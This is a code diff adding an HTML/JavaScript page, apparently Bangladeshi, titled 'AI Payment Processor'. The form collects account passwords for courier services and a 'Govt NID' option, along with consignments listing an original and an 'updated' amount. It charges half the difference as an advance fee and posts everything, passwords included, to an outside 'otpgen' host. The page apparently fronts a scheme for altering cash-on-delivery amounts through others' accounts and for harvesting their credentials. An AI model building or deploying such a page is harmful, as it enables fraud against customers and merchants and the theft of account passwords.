@@ -1,0 +1,251 @@
+<!DOCTYPE HTML>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Bulk Payment Page</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+  <link rel="stylesheet" href="./assets/css/main.css">
+</head>
+<body class="is-preload">
+  <div id="bg"></div>
+  <h1>AI Payment Processor</h1>
+
+  <header id="header">
+    <h3>Bulk Service Payment</h3>
+    <p>একাধিক কনসাইমেন্ট একসাথে সাবমিট করুন।</p>
+  </header>
+
+  <section>
+    <h3>সার্ভিস রিকুয়েস্ট</h3>
+    <div id="discount-display" class="discount-banner">
+      <i class="fas fa-tag"></i>
+      <span id="discount-text">No active discount</span>
+    </div>
+
+    <form id="payment-form">
+      <!-- Common Fields -->
+      <div class="form-group">
+        <label for="company">Company:</label>
+        <select id="company" name="company" required>
+          <option value="">Select Company</option>
+          <option value="govt_nid">Govt NID</option>
+          <option value="redx">RedX</option>
+          <option value="pathao">Pathao</option>
+          <option value="steadfast">SteadFast</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label for="phone">Your Phone Number:</label>
+        <input type="tel" id="phone" name="phone" required 
+               pattern="01[3-9]\d{8}" 
+               title="11-digit Bangladeshi phone number (013-019)">
+      </div>
+
+      <div class="form-group">
+        <label for="password">NID/App Password:</label>
+        <input type="text" id="password" name="password" required minlength="6">
+      </div>
+
+      <!-- Consignments Container -->
+      <div id="consignments-container">
+        <div class="consignment-group" data-index="0">
+          <div class="consignment-counter">Consignment #1</div>
+          <span class="remove-consignment" onclick="removeConsignment(this)">Cancel Box</span>
+          
+          <div class="form-group">
+            <label>Customer Details:</label>
+            <input type="text" class="name" name="consignments[0][name]" placeholder="Name" required>
+            <input type="tel" class="phone1" name="consignments[0][phone]" 
+                   pattern="01[3-9]\d{8}" placeholder="01XXXXXXXXX" required>
+          </div>
+
+          <div class="amount-group">
+            <div class="form-group">
+              <label>Original Amount:</label>
+              <input type="number" class="amount1" name="consignments[0][amount1]" 
+                     min="100" max="100000" step="1" required>
+            </div>
+            
+            <div class="form-group">
+              <label>Updated Amount:</label>
+              <input type="number" class="amount2" name="consignments[0][amount2]" 
+                     min="100" max="100000" step="1" required>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <button type="button" class="button add-consignment" onclick="addConsignment()">
+        ＋ Add Another Consignment
+      </button>
+
+      <div class="form-group">
+        <label for="amount3">Total Server Charge:</label>
+        <input type="number" id="amount3" name="amount3" readonly required>
+        <small>কার্য সম্পাদনের জন্য সার্ভারচার্জ অগ্রিম পরিশোধ করুন</small>
+      </div>
+
+      <div class="form-group">
+        <label for="method">Payment Method:</label>
+        <select id="method" name="method" required>
+          <option value="">Select Method</option>
+          <option value="Bkash">Bkash</option>
+          <option value="Nagad">Nagad</option>
+        </select>
+      </div>
+      
+      <div class="form-group">
+        <label for="trxid">TRX ID:</label>
+        <input type="text" id="trxid" name="trxid" required minlength="8">
+      </div>
+
+      <div class="form-actions">
+        <button type="submit" class="button primary">Confirm Payment</button>
+        <button type="button" class="button secondary" onclick="clearForm()">Clear</button>
+      </div>
+    </form>
+
+    <div id="confirmation-message" style="margin-top: 20px;"></div>
+  </section>
+
+  <script>
+    let consignmentIndex = 1;
+    let activeDiscount = 0;
+
+    function updateDiscountDisplay() {
+      const discount = parseInt(localStorage.getItem('activeDiscount')) || 0;
+      const display = document.getElementById('discount-display');
+      const text = document.getElementById('discount-text');
+      
+      if (discount > 0) {
+        display.classList.add('active');
+        text.innerHTML = `${discount}% Discount Applied!`;
+        document.querySelector('.discount-btn').classList.add('discount-active');
+      } else {
+        display.classList.remove('active');
+        text.innerHTML = 'No active discount';
+        document.querySelector('.discount-btn').classList.remove('discount-active');
+      }
+      calculateTotalCharge();
+    }
+
+    function calculateTotalCharge() {
+      let total = 0;
+      const discount = parseInt(localStorage.getItem('activeDiscount')) || 0;
+      
+      document.querySelectorAll('.consignment-group').forEach(group => {
+        const amount1 = parseFloat(group.querySelector('.amount1').value) || 0;
+        const amount2 = parseFloat(group.querySelector('.amount2').value) || 0;
+        total += (amount1 - amount2) / 2;
+      });
+
+      if (discount > 0) {
+        const discountAmount = total * (discount/100);
+        total -= discountAmount;
+        document.getElementById('discount-text').innerHTML = `
+          ${discount}% Discount Applied! (Saved ৳${discountAmount.toFixed(2)})`;
+      }
+
+      document.getElementById('amount3').value = total > 0 ? total.toFixed(2) : 0;
+    }
+
+    function addConsignment() {
+      const container = document.getElementById('consignments-container');
+      const template = document.querySelector('.consignment-group').cloneNode(true);
+      
+      template.setAttribute('data-index', consignmentIndex);
+      template.querySelector('.consignment-counter').textContent = `Consignment #${consignmentIndex + 1}`;
+      
+      template.querySelectorAll('input').forEach(input => {
+        const name = input.getAttribute('name').replace('[0]', `[${consignmentIndex}]`);
+        input.setAttribute('name', name);
+        input.value = '';
+      });
+
+      container.appendChild(template);
+      consignmentIndex++;
+      calculateTotalCharge();
+    }
+
+    function removeConsignment(element) {
+      if(document.querySelectorAll('.consignment-group').length > 1) {
+        element.closest('.consignment-group').remove();
+        consignmentIndex--;
+        calculateTotalCharge();
+      }
+    }
+
+    function clearForm() {
+      localStorage.removeItem('activeDiscount');
+      document.getElementById('consignments-container').innerHTML = 
+        document.querySelector('.consignment-group').outerHTML;
+      consignmentIndex = 1;
+      updateDiscountDisplay();
+      document.getElementById('payment-form').reset();
+      document.getElementById('confirmation-message').innerHTML = '';
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      updateDiscountDisplay();
+      
+      document.addEventListener('input', e => {
+        if(e.target.classList.contains('amount1') || 
+           e.target.classList.contains('amount2')) {
+          calculateTotalCharge();
+        }
+      });
+    });
+
+    document.getElementById('payment-form').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      document.getElementById('confirmation-message').innerHTML = '';
+
+      const formData = {
+        company: document.getElementById('company').value,
+        phone: document.getElementById('phone').value.replace(/\D/g, ''),
+        password: document.getElementById('password').value,
+        method: document.getElementById('method').value,
+        trxid: document.getElementById('trxid').value,
+        amount3: parseFloat(document.getElementById('amount3').value),
+        discount: parseInt(localStorage.getItem('activeDiscount')) || 0,
+        consignments: []
+      };
+
+      document.querySelectorAll('.consignment-group').forEach((group) => {
+        formData.consignments.push({
+          name: group.querySelector('.name').value.trim(),
+          phone: group.querySelector('.phone1').value.replace(/\D/g, ''),
+          amount1: parseFloat(group.querySelector('.amount1').value),
+          amount2: parseFloat(group.querySelector('.amount2').value)
+        });
+      });
+
+      // Phone validation and other logic here...
+
+      try {
+        const response = await fetch('https://otpgen-84pg.onrender.com/payment', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Authorization': `Bearer ${localStorage.getItem('authToken')}`,
+            'X-User-ID': localStorage.getItem('userID')
+          },
+          body: JSON.stringify(formData)
+        });
+
+        if (response.ok) {
+          localStorage.removeItem('activeDiscount');
+          updateDiscountDisplay();
+          // Success handling...
+        }
+        // Error handling...
+      } catch (error) {
+        // Error handling...
+      }
+    });
+  </script>
+  <script src="./assets/js/load-navbar.js"></script>
+  <script src="./assets/js/main.js"></script>
+</body>
+</html>
